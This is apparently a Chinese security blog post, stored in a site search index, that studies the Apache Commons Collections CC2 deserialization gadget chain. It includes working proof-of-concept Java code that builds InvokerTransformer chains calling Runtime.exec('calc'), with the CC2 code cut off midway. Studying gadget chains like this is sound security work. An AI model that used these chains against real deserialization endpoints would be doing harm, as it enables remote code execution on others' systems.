<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java安全5(7)_CC2</title>
      <link href="/2024/11/20/Java%E5%AE%89%E5%85%A85(7)_CC2/"/>
      <url>/2024/11/20/Java%E5%AE%89%E5%85%A85(7)_CC2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>现在学习一条链是越来越快了，不错，一个半小时争取拿下CC2</p></blockquote><h2 id="CC链之法也"><a href="#CC链之法也" class="headerlink" title="*CC链之法也"></a>*CC链之法也</h2><ol><li><p>commons-collections中找Gadget的过程，实际上可以简化为找⼀条从 Serializable#readObject() ⽅法到 Transformer#transform()⽅法的调⽤链，然后通过<code>Transformer#transform()</code>方法调用我们构造的恶意代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Serializable#readObejct()</span><br><span class="line">    <span class="comment">// Your Gadget Here ...</span></span><br><span class="line">    Transformer#transform()</span><br></pre></td></tr></table></figure></li></ol><h2 id="commons-collections4和commons-collections"><a href="#commons-collections4和commons-collections" class="headerlink" title="commons-collections4和commons-collections"></a>commons-collections4和commons-collections</h2><ol><li>这里的commons-collections4并不是一条利用链，而是Apache Commons Collections的两个分支版本(groupId和artifactId都变了): 前者是Commons Collections⽼的版本包；后<br>者是官⽅在2013年推出的4版本<ol><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ol></li><li>在maven仓库中搜索有下<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85(7)_CC2/%E4%B8%A4%E4%B8%AACC%E5%BA%93.png" alt="maven repo"></li></ol></li></ol><blockquote><p>官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能<br>向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版<br>本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中</p></blockquote><h2 id="流水的CC包but铁打的CC链"><a href="#流水的CC包but铁打的CC链" class="headerlink" title="流水的CC包but铁打的CC链"></a>流水的CC包but铁打的CC链</h2><h3 id="环境配置如下"><a href="#环境配置如下" class="headerlink" title="环境配置如下"></a>环境配置如下</h3><ol><li>可以换成ali源</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Old-CC-in-Commons-collections4-pocs"><a href="#Old-CC-in-Commons-collections4-pocs" class="headerlink" title="Old CC in Commons-collections4 pocs"></a>Old CC in Commons-collections4 pocs</h3><ol><li><p>⽼的利⽤链在commons-collections4中只需要少量修改就可以使用(CC1,CC3,CC6)</p><ol><li><strong>但是内部逻辑其实有了较多的不同了</strong>: TransformedMap和LazyMap<ol><li>CC1For_TransformedMap</li><li>CC1For_LazyMap</li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CC1For4_TransformedMap</span></span><br><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1For4_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 解决的方式是添加了一个ConstantTransformer</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.transformedMap(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">            <span class="comment">// 这个地方也会导致执行命令</span></span><br><span class="line">            <span class="comment">// 进入后发现有直接进行一次transformMap()对所有元素进行转换</span></span><br><span class="line">            <span class="comment">// 与原始CC库的TransformedMap的逻辑是不一样的来着</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span>  <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="Q-CC1For4-TransformedMap-poc现在会调用两次calc"><a href="#Q-CC1For4-TransformedMap-poc现在会调用两次calc" class="headerlink" title="Q: CC1For4_TransformedMap poc现在会调用两次calc?"></a>Q: CC1For4_TransformedMap poc现在会调用两次calc?</h3><ol><li><p>失去了decorate方法，主要区别在于下面</p><ol><li>变化后: <code>Map outerMap = TransformedMap.transformedMap(innerMap, null, transformerChain);</code></li><li>变化前: <code>Map outerMap = TransformedMap.decorate(innerMap, null, payload);</code></li></ol></li><li><p>进入到新的<code>transformedMap</code>中</p><ol><li>发现会返回经过transformed的数组</li><li>在transformedMap()函数中最终调用了键值转换器</li><li><strong>相比之下</strong>: 原来的<code>decorate()</code>方法仅仅对键值转换器进行赋值，并没有进行转换 –&gt; 所以这里在创建TransformedMap时就会调用一次转换触发我们恶意命令</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;K, V&gt; TransformedMap&lt;K, V&gt; <span class="title function_">transformedMap</span><span class="params">(Map&lt;K, V&gt; map, Transformer&lt;? <span class="built_in">super</span> K, ? extends K&gt; keyTransformer, Transformer&lt;? <span class="built_in">super</span> V, ? extends V&gt; valueTransformer)</span> &#123;</span><br><span class="line">    TransformedMap&lt;K, V&gt; decorated = <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        Map&lt;K, V&gt; transformed = decorated.transformMap(map);</span><br><span class="line">        decorated.clear();</span><br><span class="line">        decorated.decorated().putAll(transformed);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decorated;</span><br><span class="line">&#125;        </span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Map&lt;K, V&gt; <span class="title function_">transformMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; map)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (map.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Map&lt;K, V&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedMap</span>(map.size());</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">i$</span> <span class="operator">=</span> map.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(i$.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;? <span class="keyword">extends</span> <span class="title class_">K</span>, ? <span class="keyword">extends</span> <span class="title class_">V</span>&gt; entry = (Map.Entry)i$.next();</span><br><span class="line">            result.put(<span class="built_in">this</span>.transformKey(entry.getKey()), <span class="built_in">this</span>.transformValue(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CC2-for-commons-collections4"><a href="#CC2-for-commons-collections4" class="headerlink" title="CC2 for commons-collections4"></a>CC2 for commons-collections4</h2><h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><blockquote><p>CC2是一条专门用来应用于CC库4.0版本的新链子</p></blockquote><ol><li><p>思路是通过java.util.PriorityQueue的<code>readObject()</code>方法调用内部的heapify()方法来实现比较，而比较使用比较转换器<code>TransformingComparator</code>，可以在比较是对不同值进行转换，调用恶意代码</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gadget Chain 挺简单的一条链</span></span><br><span class="line">java.util.PriorityQueue#readObejct()</span><br><span class="line">    java.util.PriorityQueue#heapify()</span><br><span class="line">        java.util.PriorityQueue#siftDown()</span><br><span class="line">            java.util.PriorityQueue#siftDownUsingComparator()</span><br><span class="line">                org.apache.commons.collections4.comparators.TransformingComparator#Compare()              </span><br></pre></td></tr></table></figure></li></ol><h3 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h3><blockquote><p>PriorityQueue的利⽤链不⽀持在commons-collections 4前使用:  org.apache.commons.collections4.comparators.TransformingComparator ，在commons-collections4.0以前是版本中是没有实现 Serializable 接⼝的，⽆法在序列化中使⽤</p></blockquote><ol><li>java.util.PriorityQueue 是⼀个有⾃⼰ readObject() ⽅法的类，这里是java的原生库来着<ol><li>readObject中调用了heapify()</li><li>进入后到最后有调用compare()</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="org-apache-commons-collections4-comparators-TransformingComparator"><a href="#org-apache-commons-collections4-comparators-TransformingComparator" class="headerlink" title="org.apache.commons.collections4.comparators.TransformingComparator"></a>org.apache.commons.collections4.comparators.TransformingComparator</h3><ol><li><p>org.apache.commons.collections4.comparators.TransformingComparator中 compare() 有调<br>⽤ transform() ⽅法的函数，并且实现了Comparator接口</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="CC2-原始poc"><a href="#CC2-原始poc" class="headerlink" title="CC2 原始poc"></a>CC2 原始poc</h3><ol><li>现在来构建poc，总体调用链有了，主要还是条件问题</li><li>条件<ol><li><p><strong>首先是序列化问题</strong>：TransformingComparator和PriorityQueue都可以序列化，稳了Bro</p></li><li><p>java.util.PriorityQueue本身构造函数可以指定comparator</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                 Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">     <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">     <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">     <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">     <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">     <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>要触发heapify()中的siftDown()需要至少有2个元素<code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)&#123;siftDown(i, (E) queue[i]);&#125;</code></p></li><li><p>要触发siftDownUsingComparator()中的compare方法需要使得与子项进行比较(数据机构的内容)，可以构造，这里的调用与值无关，与调用有关而已，直接填入简单的1，2看看</p></li><li><p>构造比较器的逻辑也比较简单</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// poc from p牛</span></span><br><span class="line"><span class="keyword">package</span> CC2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* * * * * * 1. 构造payload * * * * * */</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)  <span class="comment">// 加上常量可以进行比较，否则会报错出来</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span 